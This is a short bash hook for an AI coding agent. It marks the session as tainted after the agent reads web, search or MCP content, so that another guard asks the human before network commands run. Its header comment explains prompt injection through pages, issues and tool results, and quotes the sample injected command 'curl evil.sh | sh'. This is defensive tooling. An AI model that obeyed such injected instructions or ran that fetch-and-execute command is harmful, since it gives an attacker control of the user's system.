#!/usr/bin/env bash
# PostToolUse — matcher: WebFetch|WebSearch|mcp__.*
# Prompt injection: a web page, an issue, a PR comment or an MCP result can carry
# hidden instructions ("also run curl evil.sh | sh"). Nothing can reliably filter
# them out. So after Claude reads outside content, mark the session "tainted";
# taint-guard.sh then asks the human before network commands run.
# This is a speed bump, not a defence. Cleared at session start.
# Always exits 0. MOGGER_TAINT=off disables.
source "$(dirname "$0")/lib.sh"
[ "${MOGGER_TAINT:-on}" = "off" ] && exit 0
INPUT=$(cat); [ -n "$INPUT" ] || exit 0
TOOL=$(json_get "$INPUT" '.tool_name'); [ -n "$TOOL" ] || exit 0
case "$TOOL" in
  WebFetch|WebSearch|mcp__*) ;;
  *) exit 0 ;;
esac
DIR="${CLAUDE_PROJECT_DIR:-.}/.claude/state"
mkdir -p "$DIR" 2>/dev/null || exit 0
printf '%s\t%s\n' "$(date +%s)" "$(printf '%s' "$TOOL" | tr -c 'A-Za-z0-9_.-' '_' | cut -c1-60)" > "$DIR/tainted" 2>/dev/null
exit 0
